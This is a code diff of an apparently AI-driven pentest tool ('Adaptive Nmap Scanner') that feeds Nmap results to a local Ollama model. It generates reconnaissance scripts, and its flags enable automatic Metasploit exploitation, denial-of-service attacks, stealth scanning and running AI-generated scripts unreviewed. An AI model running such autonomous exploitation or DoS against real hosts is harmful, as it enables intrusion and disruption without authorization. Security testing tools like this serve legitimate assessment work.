-            self.logger.error(f"Nmap scan error: {str(e)}")
-            self.viewer.error(f"Nmap scan error: {str(e)}")
-            return None
+                
         except Exception as e:
-            self.logger.error(f"Error during Nmap scan: {str(e)}")
-            self.logger.debug(traceback.format_exc())
-            self.viewer.error(f"Error during Nmap scan: {str(e)}")
+            self.logger.error(f"Error running Nmap scan: {e}")
+            self.viewer.error(f"Nmap scan failed: {str(e)}")
             return None
-
+    
     def summarize_results(self, result):
-        """Create a summary of the scan results for history."""
-        if not result or 'scan' not in result:
-            return "No results"
-        
-        target = self.target
-        if target not in result['scan']:
-            return "Target not found in results"
-        
-        host_data = result['scan'][target]
-        
-        summary = {
-            "hostname": host_data.get('hostnames', [{'name': 'unknown'}])[0]['name'],
-            "state": host_data.get('status', {}).get('state', 'unknown'),
-            "open_ports": {}
+        """Summarize the scan results."""
+        try:
+            if not result or 'scan' not in result or self.target not in result['scan']:
+                self.logger.warning(f"No results to summarize for {self.target}")
+                return
+                
+            target_info = result['scan'][self.target]
+            
+            # Basic host info
+            status = target_info.get('status', {}).get('state', 'unknown')
+            hostname = "Unknown"
+            if 'hostnames' in target_info and target_info['hostnames']:
+                hostname = target_info['hostnames'][0].get('name', 'Unknown')
+                
+            os_match = "Unknown"
+            if 'osmatch' in target_info and target_info['osmatch']:
+                os_match = target_info['osmatch'][0].get('name', 'Unknown')
+                
+            self.logger.info(f"Host {self.target} ({hostname}) is {status}")
+            self.logger.info(f"OS: {os_match}")
+            
+            # Open ports
+            open_ports = []
+            for proto in ['tcp', 'udp']:
+                if proto in target_info:
+                    for port, port_data in target_info[proto].items():
+                        if port_data['state'] == 'open':
+                            service = port_data.get('name', 'unknown')
+                            product = port_data.get('product', '')
+                            version = port_data.get('version', '')
+                            
+                            port_info = f"{port}/{proto}: {service}"
+                            if product:
+                                port_info += f" ({product}"
+                                if version:
+                                    port_info += f" {version}"
+                                port_info += ")"
+                                
+                            self.logger.info(f"Open port: {port_info}")
+                            open_ports.append(port_info)
+            
+            self.logger.info(f"Found {len(open_ports)} open ports")
+            
+        except Exception as e:
+            self.logger.error(f"Error summarizing results: {e}")
+    
+    # Ollama integration methods
+    def prepare_ollama_context(self):
+        """Prepare context for Ollama."""
+        context = {
+            'target': self.target,
+            'scan_history': self.scan_history,
+            'open_ports': self.get_open_ports_from_history()
         }
         
-        # Collect TCP ports
-        if 'tcp' in host_data:
-            for port, port_data in host_data['tcp'].items():
-                if port_data['state'] == 'open':
-                    summary['open_ports'][f"{port}/tcp"] = {
-                        "service": port_data.get('name', 'unknown'),
-                        "product": port_data.get('product', ''),
-                        "version": port_data.get('version', '')
-                    }
-        
-        # Collect UDP ports
-        if 'udp' in host_data:
-            for port, port_data in host_data['udp'].items():
-                if port_data['state'] == 'open':
-                    summary['open_ports'][f"{port}/udp"] = {
-                        "service": port_data.get('name', 'unknown'),
-                        "product": port_data.get('product', ''),
-                        "version": port_data.get('version', '')
-                    }
-        
-        return summary
-
-    def prepare_ollama_context(self):
-        """Prepare context from scan history for Ollama."""
-        if not self.scan_history:
-            return "No previous scan data available."
-        
-        context = []
-        for i, scan in enumerate(self.scan_history[-3:]):  # Use at most the last 3 scans
-            params = scan.get('params', [])
-            summary = scan.get('result_summary', {})
+        # Additional context from latest scan
+        if self.scan_history:
+            latest_scan = self.scan_history[-1]
+            result = latest_scan.get('result', {})
             
-            context.append(f"Scan {i+1}: Parameters: {' '.join(params)}")
-            
-            if isinstance(summary, dict) and 'open_ports' in summary:
-                ports_info = []
-                for port_key, port_data in summary['open_ports'].items():
-                    service_version = f"{port_data['service']} {port_data['product']} {port_data['version']}".strip()
-                    ports_info.append(f"{port_key}: {service_version}")
+            if 'scan' in result and self.target in result['scan']:
+                target_info = result['scan'][self.target]
                 
-                if ports_info:
-                    context.append(f"Results: Found {len(ports_info)} open ports:")
-                    context.extend([f"  - {info}" for info in ports_info])
-                else:
-                    context.append("Results: No open ports found")
-            else:
-                context.append(f"Results: {summary}")
-        
-        return "\n".join(context)
-
-    def call_ollama(self, prompt, stream=False):
-        """
-        Call the Ollama API to generate a response
-        
-        Args:
-            prompt (str): The prompt to send to Ollama
-            stream (bool): Whether to stream the response
-            
-        Returns:
-            str: The generated response
-        """
-        try:
-            # Verify Ollama API is running with a simple health check
-            ollama_url = "http://localhost:11434/api/generate"
-            health_check_url = "http://localhost:11434/"
-            
-            # First try a simple connection to check if Ollama is running
-            try:
-                health_response = requests.get(health_check_url, timeout=5)
-                if health_response.status_code != 200:
-                    self.logger.warning(f"Ollama API health check failed with status code: {health_response.status_code}")
-                    self.viewer.warning("Warning: Ollama API health check failed")
-                else:
-                    self.logger.debug("Ollama API health check successful")
-            except requests.exceptions.RequestException as e:
-                self.logger.warning(f"Ollama API health check failed: {str(e)}")
-                self.viewer.warning("Warning: Cannot connect to Ollama API. Please check if Ollama is running")
-                
-                # Check if Ollama process is running as a backup check
-                if os.name == 'posix':  # Unix/Linux
-                    ollama_running = subprocess.run(["pgrep", "ollama"], stdout=subprocess.PIPE).returncode == 0
-                else:  # Windows and others
-                    ollama_running = "ollama" in subprocess.run(["tasklist"], stdout=subprocess.PIPE, text=True).stdout.lower()
+                # Extract OS info
+                if 'osmatch' in target_info and target_info['osmatch']:
+                    context['os'] = target_info['osmatch'][0].get('name', 'Unknown')
                     
-                if not ollama_running:
-                    self.logger.error("Ollama process not detected, service is not running")
-                    self.viewer.warning("Ollama service not detected - trying to proceed without AI assistance")
-                    return self.generate_fallback_response(prompt)
+                # Extract hostname
+                if 'hostnames' in target_info and target_info['hostnames']:
+                    context['hostname'] = target_info['hostnames'][0].get('name', 'Unknown')
+                    
+                # Extract service details
+                services = []
+                for proto in ['tcp', 'udp']:
+                    if proto in target_info:
+                        for port, port_data in target_info[proto].items():
+                            if port_data['state'] == 'open':
+                                service = {
+                                    'port': port,
+                                    'proto': proto,
+                                    'name': port_data.get('name', 'unknown'),
+                                    'product': port_data.get('product', ''),
+                                    'version': port_data.get('version', '')
+                                }
+                                services.append(service)
+                                
+                context['services'] = services
+        
+        return context
+    
+    def call_ollama(self, prompt, stream=False):
+        """Call the Ollama API to generate text."""
+        try:
+            self.logger.info("Calling Ollama API...")
             
-            # Increase default timeout based on system resources
-            base_timeout = 180  # Increased base timeout to 3 minutes
-            
-            # Configure API timeout based on available system memory
-            if HAS_PSUTIL:
-                total_mem = psutil.virtual_memory().total / (1024 * 1024 * 1024)  # GB
-                # Scale timeout based on available memory
-                if total_mem < 8:  # Less than 8GB RAM
-                    timeout = base_timeout * 2  # 6 minutes for low-memory systems
-                    self.logger.warning(f"Limited system memory detected ({total_mem:.1f}GB), increasing Ollama timeout to {timeout}s")
-                    self.viewer.warning(f"Limited RAM detected ({total_mem:.1f}GB) - Ollama may be slow")
-                elif total_mem < 16:  # 8-16GB RAM
-                    timeout = base_timeout * 1.5  # 4.5 minutes for medium-memory systems
-                    self.logger.info(f"Medium system memory detected ({total_mem:.1f}GB), setting Ollama timeout to {timeout}s")
-                else:
-                    timeout = base_timeout  # Base timeout for high-memory systems
-                    self.logger.info(f"Sufficient system memory detected ({total_mem:.1f}GB)")
-            else:
-                timeout = base_timeout
-                self.logger.info(f"Using default timeout of {timeout}s for Ollama API")
-            
-            # Prepare payload
-            payload = {
+            # Prepare request
+            request_data = {
                 "model": self.ollama_model,
                 "prompt": prompt,
                 "stream": stream
             }
             
-            self.logger.debug(f"Calling Ollama API with model: {self.ollama_model}")
-            
-            # Try to verify model exists before making full request
+            # Make the API call
+            animation = None
+            if not self.show_live_ai:
+                animation = self.viewer.scanning_animation("Generating AI response")
+                
             try:
-                model_check_url = "http://localhost:11434/api/tags"
-                model_response = requests.get(model_check_url, timeout=5)
-                if model_response.status_code == 200:
-                    models = model_response.json().get("models", [])
-                    model_names = [model.get("name") for model in models]
-                    if self.ollama_model not in model_names:
-                        self.logger.warning(f"Model '{self.ollama_model}' not found in Ollama. Available models: {', '.join(model_names)}")
-                        self.viewer.warning(f"Warning: Model '{self.ollama_model}' may not be available. Try pulling it with 'ollama pull {self.ollama_model}'")
+                response = requests.post(
+                    self.ollama_url,
+                    json=request_data,
+                    stream=stream,
+                    timeout=60
+                )
+                
+                # Check for successful response
+                if response.status_code != 200:
+                    self.logger.error(f"Ollama API error: {response.status_code} - {response.text}")
+                    if animation:
+                        animation.set()
+                    return self.generate_fallback_response(prompt)
+                
+                # Handle streaming response
+                if stream:
+                    return self._handle_streaming_response(response, animation)
+                    
+                # Handle regular response
+                result = response.json()
+                
+                if 'response' in result:
+                    if animation:
+                        animation.set()
+                    return result['response']
+                else:
+                    self.logger.error(f"Unexpected response format from Ollama API: {result}")
+                    if animation:
+                        animation.set()
+                    return self.generate_fallback_response(prompt)
+                    
+            except requests.exceptions.Timeout:
+                self.logger.error("Timeout calling Ollama API")
+                if animation:
+                    animation.set()
+                self.viewer.warning("AI response timed out, using fallback")
+                return self.generate_fallback_response(prompt)
+                
             except Exception as e:
-                self.logger.debug(f"Failed to check available models: {str(e)}")
-            
-            if stream:
-                self.viewer.header(f"LIVE AI ANALYSIS USING {self.ollama_model.upper()}", "=")
-                self.viewer.status("AI is analyzing the data... (showing live output)")
-                print(f"\n{'-' * self.viewer.width}")
-                print(f"PROMPT: {prompt[:100]}..." if len(prompt) > 100 else f"PROMPT: {prompt}")
-                print(f"{'-' * self.viewer.width}")
-                print("AI THINKING:", end=" ", flush=True)
+                self.logger.error(f"Error calling Ollama API: {e}")
+                if animation:
+                    animation.set()
+                return self.generate_fallback_response(prompt)
                 
-                full_response = ""
-                char_count = 0
-                line_width = max(self.viewer.width - 5, 70)  # Account for terminal size
-                
-                try:
-                    with requests.post(ollama_url, json=payload, stream=True, timeout=timeout) as response:
-                        if response.status_code != 200:
-                            self.logger.error(f"Ollama API error: {response.status_code}")
-                            print(f"\nAPI ERROR: {response.status_code}")
-                            
-                            # Try to get more error details
-                            error_details = "Unknown error"
-                            try:
-                                error_details = response.json().get("error", "Unknown error")
-                            except:
-                                pass
-                                
-                            print(f"Error details: {error_details}")
-                            print(f"\nFalling back to default parameters...")
-                            
-                            return self.generate_fallback_response(prompt)
-                        
-                        buffer = ""
-                        for line in response.iter_lines():
-                            if line:
-                                data = json.loads(line.decode('utf-8'))
-                                if 'response' in data:
-                                    chunk = data['response']
-                                    full_response += chunk
-                                    buffer += chunk
-                                    char_count += len(chunk)
-                                    
-                                    # Print chunks to the console
-                                    print(chunk, end="", flush=True)
-                                    
-                                    # Handle line breaks for better display
-                                    if char_count >= line_width or '\n' in buffer:
-                                        buffer = ""
-                                        char_count = 0
-                                        
-                                if data.get('done', False):
-                                    break
-                    
-                    print("\n" + "-" * self.viewer.width)
-                    return full_response
-                    
-                except requests.exceptions.Timeout:
-                    print("\nTIMEOUT ERROR: Ollama took too long to respond")
-                    self.logger.error(f"Streaming request to Ollama timed out after {timeout}s")
-                    print(f"\nFalling back to default parameters...")
-                    return self.generate_fallback_response(prompt)
-            else:
-                # Non-streaming request
-                self.viewer.status(f"Getting AI recommendations using {self.ollama_model}...")
-                
-                try:
-                    response = requests.post(ollama_url, json=payload, timeout=timeout)
-                    
-                    if response.status_code == 200:
-                        result = response.json()
-                        return result.get("response", "")
-                    else:
-                        self.logger.error(f"Ollama API error: {response.status_code}")
-                        self.viewer.warning(f"Ollama API returned error {response.status_code}, using fallback parameters")
-                        
-                        # Try to get more error details
-                        error_details = "Unknown error"
-                        try:
-                            error_details = response.json().get("error", "Unknown error")
-                            self.logger.error(f"Ollama error details: {error_details}")
-                        except:
-                            pass
-                        
-                        return self.generate_fallback_response(prompt)
-                except requests.exceptions.Timeout:
-                    self.logger.error(f"Ollama API request timed out after {timeout}s")
-                    self.viewer.warning(f"Ollama timeout - using fallback parameters")
-                    return self.generate_fallback_response(prompt)
-                
-        except requests.exceptions.ConnectionError:
-            self.logger.error("Failed to connect to Ollama API. Make sure Ollama is running.")
-            self.viewer.warning("Cannot connect to Ollama service, using fallback parameters")
-            return self.generate_fallback_response(prompt)
         except Exception as e:
-            self.logger.error(f"Error calling Ollama: {str(e)}")
-            self.logger.debug(traceback.format_exc())
-            self.viewer.warning(f"Error using Ollama: {str(e)}")
+            self.logger.error(f"Unexpected error in call_ollama: {e}")
             return self.generate_fallback_response(prompt)
+    
+    def _handle_streaming_response(self, response, animation):
+        """Handle streaming response from Ollama."""
+        try:
+            full_response = ""
             
+            for line in response.iter_lines():
+                if line:
+                    try:
+                        # Parse JSON from the line
+                        json_data = json.loads(line.decode('utf-8'))
+                        
+                        # Extract response chunk
+                        if 'response' in json_data:
+                            chunk = json_data['response']
+                            full_response += chunk
+                            
+                            # Display chunk if live output is enabled
+                            if self.show_live_ai:
+                                print(chunk, end='', flush=True)
+                    except json.JSONDecodeError:
+                        self.logger.warning(f"Could not parse JSON from line: {line}")
+            
+            # Add a newline after streaming if we showed live output
+            if self.show_live_ai:
+                print()
+            
+            # Stop the animation if it was started
+            if animation:
+                animation.set()
+                
+            return full_response
+            
+        except Exception as e:
+            self.logger.error(f"Error handling streaming response: {e}")
+            
+            # Stop the animation if it was started
+            if animation:
+                animation.set()
+                
+            return self.generate_fallback_response("Error processing streaming response")
+    
     def generate_fallback_response(self, prompt):
-        """Generate a fallback response when Ollama is unavailable."""
-        self.logger.info("Generating fallback parameters without AI assistance")
+        """Generate a fallback response when Ollama fails."""
+        self.logger.info("Generating fallback response...")
         
-        # Determine what kind of response we need based on the prompt
-        if "recommend the next optimal Nmap scan parameters" in prompt:
-            # This is a scan parameter generation request
-            if self.stealth:
-                return (
-                    "Analysis: Using non-AI fallback parameters for stealth scan\n"
-                    "Parameters: [-sS -T2 -p- -Pn]\n"
-                    "Rationale: Stealth SYN scan with reduced timing to avoid detection"
-                )
-            else:
-                return (
-                    "Analysis: Using non-AI fallback parameters for thorough scan\n"
-                    "Parameters: [-sV -sC -O -p- --version-all]\n"
-                    "Rationale: Complete version detection, OS detection, and script scanning"
-                )
-        elif "generate a custom script" in prompt:
-            # This is a script generation request
+        # Extract key information from prompt
+        target = self.target
+        open_ports = self.get_open_ports_from_history()
+        
+        # Check if prompt is for script generation
+        if "Generate a " in prompt and "script" in prompt:
             script_type = "bash"
-            if "python script" in prompt:
+            if "python" in prompt.lower():
                 script_type = "python"
-            elif "ruby script" in prompt:
+            elif "ruby" in prompt.lower():
                 script_type = "ruby"
+            elif "powershell" in prompt.lower():
+                script_type = "powershell"
                 
             if script_type == "bash":
-                return (
-                    "```bash\n"
-                    "#!/bin/bash\n"
-                    "# SCRIPT SUMMARY: Basic host enumeration script (AI unavailable)\n"
-                    "\n"
-                    "TARGET=\"$1\"\n"
-                    "if [ -z \"$TARGET\" ]; then\n"
-                    "    echo \"Usage: $0 <target_ip>\"\n"
-                    "    exit 1\n"
-                    "fi\n"
-                    "\n"
-                    "echo \"Basic Host Enumeration for $TARGET\"\n"
-                    "echo \"--------------------------------\"\n"
-                    "\n"
-                    "# Basic ping check\n"
-                    "ping -c 1 -W 1 $TARGET > /dev/null\n"
-                    "if [ $? -eq 0 ]; then\n"
-                    "    echo \"[+] Host is up\"\n"
-                    "else\n"
-                    "    echo \"[-] Host appears to be down\"\n"
-                    "fi\n"
-                    "\n"
-                    "# Simple port scan with netcat\n"
-                    "echo \"[*] Checking common ports...\"\n"
-                    "for port in 21 22 23 25 53 80 443 445 3306 3389 8080; do\n"
-                    "    (echo > /dev/tcp/$TARGET/$port) > /dev/null 2>&1\n"
-                    "    if [ $? -eq 0 ]; then\n"
-                    "        echo \"[+] Port $port is open\"\n"
-                    "    fi\n"
-                    "done\n"
-                    "\n"
-                    "echo \"[*] Scan complete\"\n"
-                    "```"
-                )
+                return f"""```bash
+#!/bin/bash
+# Reconnaissance Script for {target}
+# Generated as fallback when AI is unavailable
+# This script performs basic reconnaissance on the target system
+
+TARGET="{target}"
+OPEN_PORTS=({' '.join(str(port) for port in open_ports)})
+
+echo "Starting reconnaissance on $TARGET"
+echo "Open ports: ${{OPEN_PORTS[@]}}"
+
+# Ping the target
+echo "Checking if host is up..."
+ping -c 3 $TARGET
+
+# Check each open port
+for PORT in "${{OPEN_PORTS[@]}}"; do
+  echo "Checking port $PORT..."
+  
+  case $PORT in
+    21)
+      echo "FTP port detected, checking banner..."
+      echo -e "\\n" | nc -w 5 $TARGET $PORT
+      ;;
+    22)
+      echo "SSH port detected, checking banner..."
+      echo -e "\\n" | nc -w 5 $TARGET $PORT
+      ;;
+    80|443)
+      echo "Web port detected, checking headers..."
+      curl -s -I http://$TARGET:$PORT
+      ;;
+    *)
+      echo "Generic port check..."
+      nc -z -w 5 $TARGET $PORT && echo "Port $PORT is open" || echo "Port $PORT is closed"
+      ;;
+  esac
+done
+
+echo "Reconnaissance completed"
+```"""
             elif script_type == "python":
-                return (
-                    "```python\n"
-                    "#!/usr/bin/env python3\n"
-                    "# SCRIPT SUMMARY: Basic port scanner (AI unavailable)\n"
-                    "\n"
-                    "import sys\n"
-                    "import socket\n"
-                    "\n"
-                    "def scan_host(target):\n"
-                    "    \"\"\"Scan common ports on the target host.\"\"\"\n"
-                    "    print(f\"Basic Port Scanner for {target}\")\n"
-                    "    print(\"-\" * 30)\n"
-                    "    \n"
-                    "    common_ports = [21, 22, 23, 25, 53, 80, 443, 445, 3306, 3389, 8080]\n"
-                    "    \n"
-                    "    for port in common_ports:\n"
-                    "        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n"
-                    "        sock.settimeout(1)\n"
-                    "        result = sock.connect_ex((target, port))\n"
-                    "        if result == 0:\n"
-                    "            print(f\"[+] Port {port} is open\")\n"
-                    "        sock.close()\n"
-                    "    \n"
-                    "    print(\"[*] Scan complete\")\n"
-                    "\n"
-                    "if __name__ == \"__main__\":\n"
-                    "    if len(sys.argv) != 2:\n"
-                    "        print(f\"Usage: {sys.argv[0]} <target_ip>\")\n"
-                    "        sys.exit(1)\n"
-                    "    \n"
-                    "    scan_host(sys.argv[1])\n"
-                    "```"
-                )
-            else:  # Ruby
-                return (
-                    "```ruby\n"
-                    "#!/usr/bin/env ruby\n"
-                    "# SCRIPT SUMMARY: Basic port scanner (AI unavailable)\n"
-                    "\n"
-                    "require 'socket'\n"
-                    "\n"
-                    "def scan_port(ip, port)\n"
-                    "  begin\n"
-                    "    socket = TCPSocket.new(ip, port)\n"
-                    "    socket.close\n"
-                    "    return true\n"
-                    "  rescue Errno::ECONNREFUSED, Errno::ETIMEDOUT\n"
-                    "    return false\n"
-                    "  end\n"
-                    "end\n"
-                    "\n"
-                    "if ARGV.length != 1\n"
-                    "  puts \"Usage: #{$0} <target_ip>\"\n"
-                    "  exit(1)\n"
-                    "end\n"
-                    "\n"
-                    "target = ARGV[0]\n"
-                    "\n"
-                    "puts \"Basic Port Scanner for #{target}\"\n"
-                    "puts \"-\" * 30\n"
-                    "\n"
-                    "common_ports = [21, 22, 23, 25, 53, 80, 443, 445, 3306, 3389, 8080]\n"
-                    "\n"
-                    "common_ports.each do |port|\n"
-                    "  if scan_port(target, port)\n"
-                    "    puts \"[+] Port #{port} is open\"\n"
-                    "  end\n"
-                    "end\n"
-                    "\n"
-                    "puts \"[*] Scan complete\"\n"
-                    "```"
-                )
-        else:
-            # Generic fallback
-            return "Ollama AI service unavailable. Using default parameters instead."
+                return f"""```python
+#!/usr/bin/env python3
+# Reconnaissance Script for {target}
+# Generated on {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
+# This script performs basic reconnaissance on the target system
 
+import socket
+import subprocess
+import sys
+import os
+
+TARGET = "{target}"
+OPEN_PORTS = {open_ports}
+
+def main():
+    print(f"Starting reconnaissance on {{TARGET}}")
+    print(f"Open ports: {{OPEN_PORTS}}")
+    
+    # Ping the target
+    print("Checking if host is up...")
+    try:
+        subprocess.run(["ping", "-c", "3", TARGET], check=True)
+    except subprocess.CalledProcessError:
+        print(f"Host {{TARGET}} appears to be down")
+    
+    # Check each open port
+    for port in OPEN_PORTS:
+        print(f"Checking port {{port}}...")
+        
+        try:
+            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+                s.settimeout(5)
+                result = s.connect_ex((TARGET, port))
+                if result == 0:
+                    print(f"Port {{port}} is open")
+                else:
+                    print(f"Port {{port}} is closed")
+        except Exception as e:
+            print(f"Error checking port {{port}}: {{e}}")
+    
+    print("Reconnaissance completed")
+
+if __name__ == "__main__":
+    main()
+```"""
+        
+        # Default fallback response
+        fallback_response = f"""Based on the reconnaissance of {target}, here are the key findings:
+
+1. Open Ports: {", ".join(str(port) for port in open_ports) if open_ports else "None detected"}
+
+2. Recommended Actions:
+   - Perform a more detailed scan of the open ports
+   - Investigate any running services for vulnerabilities
+   - Document findings for further analysis
+
+This is a basic response generated when the AI model is unavailable."""
+
+        return fallback_response
+    
     def parse_ollama_response(self, response):
-        """Parse Ollama response to extract Nmap parameters."""
-        if not response:
-            return []
-        
-        # Clean up the response
-        lines = response.strip().split('\n')
-        
-        # Look for lines that start with nmap or -
-        for line in lines:
-            line = line.strip()
-            if line.startswith('nmap '):
-                # Remove 'nmap ' prefix and split into parameters
-                return line[5:].split()
-            elif line.startswith('-') and ' ' in line:
-                # This looks like Nmap parameters, split it
-                return line.split()
-        
-        # Fallback: just return all non-empty lines joined and split by spaces
-        all_text = ' '.join([l.strip() for l in lines if l.strip()])
-        return all_text.split()
-
+        """Parse the response from Ollama to extract key information."""
+        try:
+            # For script generation, extract code blocks
+            if "```" in response:
+                code_block_pattern = r"```(?:\w+)?\s*(.+?)```"
+                code_blocks = re.findall(code_block_pattern, response, re.DOTALL)
+                
+                if code_blocks:
+                    return code_blocks[0].strip()
+            
+            # Otherwise, return the full response
+            return response.strip()
+            
+        except Exception as e:
+            self.logger.error(f"Error parsing Ollama response: {e}")
+            return response.strip()
+    
     def get_open_ports_from_history(self):
-        """Get a comma-separated list of open ports from scan history."""
-        if not self.scan_history:
-            return ""
+        """Get a list of open ports from the scan history."""
+        open_ports = []
         
-        open_ports = set()
+        for entry in self.scan_history:
+            result = entry.get('result', {})
+            
+            if 'scan' in result and self.target in result['scan']:
+                target_info = result['scan'][self.target]
+                
+                for proto in ['tcp', 'udp']:
+                    if proto in target_info:
+                        for port, port_data in target_info[proto].items():
+                            if port_data['state'] == 'open':
+                                try:
+                                    port_num = int(port)
+                                    if port_num not in open_ports:
+                                        open_ports.append(port_num)
+                                except ValueError:
+                                    pass
         
-        for scan in self.scan_history:
-            summary = scan.get('result_summary', {})
-            if isinstance(summary, dict) and 'open_ports' in summary:
-                for port_key in summary['open_ports'].keys():
-                    port = port_key.split('/')[0]  # Extract port number from "port/protocol"
-                    open_ports.add(port)
-        
-        return ','.join(sorted(open_ports, key=int)) if open_ports else ""
-
+        return sorted(open_ports)
+    
     def construct_prompt(self, iteration):
-        """Construct a prompt for Ollama based on scan history."""
+        """Construct a prompt for the LLM based on scan results and current iteration."""
+        # Get context from scan history
         context = self.prepare_ollama_context()
         
-        prompt = f"""Given the previous Nmap scan results, recommend the next optimal Nmap scan parameters for a {iteration}{'st' if iteration == 1 else 'nd' if iteration == 2 else 'rd' if iteration == 3 else 'th'} iteration scan against {self.target}.
- 
-Previous scan information:
-{context}
- 
-Provide the Nmap command line parameters (without 'nmap' prefix) for the next scan to gain more information about the target, discover services and potential vulnerabilities.
-{'Use stealthy techniques to avoid detection.' if self.stealth else ''}
-
-Please format your response as follows:
-Analysis: [Your analysis of the previous scan results]
-Parameters: [The specific parameters to use]
-Rationale: [Why these parameters are appropriate for the next scan]
-"""
+        # Construct prompt based on iteration and context
+        if iteration == 1:
+            prompt = f"Based on the initial scan of {self.target}, suggest the next steps for reconnaissance."
+        elif iteration == 2:
+            prompt = f"Based on the detailed scan of {self.target}, identify potential vulnerabilities and suggest exploitation strategies."
+        else:
+            prompt = f"Based on comprehensive scanning of {self.target}, provide a security assessment and recommended actions."
+            
         return prompt
 
 def main():
-    parser = argparse.ArgumentParser(
-        description="Adaptive Nmap scanner with Ollama and Metasploit integration",
-        formatter_class=argparse.RawDescriptionHelpFormatter
-    )
+    """Main entry point for the script."""
+    # Parse command line arguments
+    args = parse_arguments()
     
-    # Optional target
-    parser.add_argument("target", nargs="?", 
-                        help="Target IP address or hostname (optional if --auto-discover is used)")
-    
-    # General options group
-    general_group = parser.add_argument_group('General Options')
-    general_group.add_argument("--model", default="qwen2.5-coder:7b",
-                        help="Ollama model to use (default: qwen2.5-coder:7b, alternatives: llama3)")
-    general_group.add_argument("--iterations", type=int, default=3, 
-                        help="Maximum number of scan iterations (default: 3)")
-    general_group.add_argument("--continuous", action="store_true", 
-                        help="Run in continuous mode until manually stopped")
-    general_group.add_argument("--delay", type=int, default=2, 
-                        help="Delay in seconds between scans (default: 2)")
-    general_group.add_argument("--quiet", action="store_true", 
-                        help="Reduce verbosity of output")
-    general_group.add_argument("--debug", action="store_true", 
-                        help="Enable debug logging")
-    general_group.add_argument("--version", action="store_true", 
-                        help="Show version information and exit\n")
-    
-    # Scan Mode options
-    scan_group = parser.add_argument_group('Scan Mode Options')
-    scan_group.add_argument("--stealth", action="store_true", 
-                        help="Enable stealth mode for scans to avoid detection")
-    scan_group.add_argument("--full-auto", action="store_true", 
-                        help="Full autonomous mode (implies --continuous --msf --exploit --auto-script)\n")
-    
-    # Metasploit Integration options
-    msf_group = parser.add_argument_group('Metasploit Integration')
-    msf_group.add_argument("--msf", action="store_true", 
-                        help="Enable Metasploit integration")
-    msf_group.add_argument("--exploit", action="store_true", 
-                        help="Automatically attempt exploitation using Metasploit")
-    msf_group.add_argument("--workspace", default="adaptive_scan", 
-                        help="Metasploit workspace name (default: adaptive_scan)")
-    msf_group.add_argument("--auto-script", action="store_true", 
-                        help="Auto-generate and run Metasploit resource scripts")
-    msf_group.add_argument("--dos", action="store_true", 
-                        help="Attempt Denial of Service attacks against target hosts\n")
-    
-    # Network Discovery options
-    discover_group = parser.add_argument_group('Network Discovery Options')
-    discover_group.add_argument("--auto-discover", action="store_true", 
-                        help="Automatically discover network and hosts")
-    discover_group.add_argument("--interface", 
-                        help="Network interface to use for discovery")
-    discover_group.add_argument("--scan-all", action="store_true", 
-                        help="Scan all discovered hosts (implies --auto-discover)")
-    discover_group.add_argument("--network", 
-                        help="Specific network to scan in CIDR notation (e.g., 192.168.1.0/24)")
-    discover_group.add_argument("--host-timeout", type=int, default=1, 
-                        help="Timeout in seconds for host discovery (default: 1)\n")
-    
-    # Script Generation options
-    script_group = parser.add_argument_group('Script Generation Options')
-    script_group.add_argument("--custom-scripts", action="store_true", 
-                        help="Enable AI-powered custom script generation")
-    script_group.add_argument("--script-type", choices=["bash", "python", "ruby"], default="bash", 
-                        help="Type of custom script to generate (default: bash)")
-    script_group.add_argument("--execute-scripts", action="store_true", 
-                        help="Automatically execute generated scripts (use with caution)\n")
-    
-    # AI Display options
-    ai_group = parser.add_argument_group('AI Display Options')
-    ai_group.add_argument("--show-live-ai", action="store_true", 
-                        help="Show the AI's thought process in real-time during generation")
-    
-    args = parser.parse_args()
-    
-    # Display version if requested
-    if args.version:
-        print("AI_MAL Adaptive Nmap Scanner version 1.0.0")
-        print("Copyright (c) 2024")
-        sys.exit(0)
-    
-    # Set logging level
+    # Configure logging based on debug flag
     if args.debug:
         logger.setLevel(logging.DEBUG)
-    elif args.quiet:
-        logger.setLevel(logging.WARNING)
+        for handler in logger.handlers:
+            handler.setLevel(logging.DEBUG)
     
+    # Print version and exit if requested
+    if args.version:
+        print(f"Advanced Adaptive Nmap Scanner v1.2.1")
+        print("AI-powered network reconnaissance and exploitation framework")
+        return 0
+    
+    # Create and run scanner
+    try:
+        scanner = AdaptiveNmapScanner(
+            target=args.target,
+            ollama_model=args.model,
+            max_iterations=args.iterations,
+            continuous=args.continuous,
+            delay=args.delay,
+            msf_integration=args.msf,
+            exploit=args.exploit,
+            msf_workspace=args.workspace,
+            stealth=args.stealth,
+            auto_script=args.auto_script,
+            quiet=args.quiet,
+            debug=args.debug,
+            auto_discover=args.auto_discover,
+            interface=args.interface,
+            scan_all=args.scan_all,
+            network=args.network,
+            host_timeout=args.host_timeout,
+            custom_scripts=args.custom_scripts,
+            script_type=args.script_type,
+            execute_scripts=args.execute_scripts,
+            dos_attack=args.dos,
+            show_live_ai=args.show_ai
+        )
+        
+        scanner.run()
+        return 0
+        
+    except KeyboardInterrupt:
+        logger.info("Scan interrupted by user")
+        print("\nScan interrupted by user")
+        return 1
+        
+    except Exception as e:
+        logger.error(f"Error in main: {e}")
+        if args.debug:
+            logger.error(traceback.format_exc())
+        print(f"\nError: {str(e)}")
+        return 1
+
+
+def parse_arguments():
+    """Parse command line arguments."""
+    parser = argparse.ArgumentParser(
+        description="Advanced Adaptive Nmap Scanner with Ollama and Metasploit Integration",
+        formatter_class=argparse.ArgumentDefaultsHelpFormatter
+    )
+    
+    # Target selection options
+    target_group = parser.add_argument_group("Target Selection")
+    target_group.add_argument(
+        "target", 
+        nargs="?",
+        help="Target IP or hostname to scan (optional if using auto-discover)"
+    )
+    target_group.add_argument(
+        "--auto-discover", 
+        action="store_true",
+        help="Automatically discover hosts on the network"
+    )
+    target_group.add_argument(
+        "--scan-all", 
+        action="store_true",
+        help="Scan all discovered hosts"
+    )
+    target_group.add_argument(
+        "--interface", 
+        help="Network interface to use for discovery"
+    )
+    target_group.add_argument(
+        "--network", 
+        help="Network CIDR to scan (e.g., 192.168.1.0/24)"
+    )
+    target_group.add_argument(
+        "--host-timeout", 
+        type=int, 
+        default=1,
+        help="Timeout in seconds for host discovery"
+    )
+    
+    # Scan options
+    scan_group = parser.add_argument_group("Scan Options")
+    scan_group.add_argument(
+        "--iterations", 
+        type=int, 
+        default=3,
+        help="Maximum number of scan iterations"
+    )
+    scan_group.add_argument(
+        "--continuous", 
+        action="store_true",
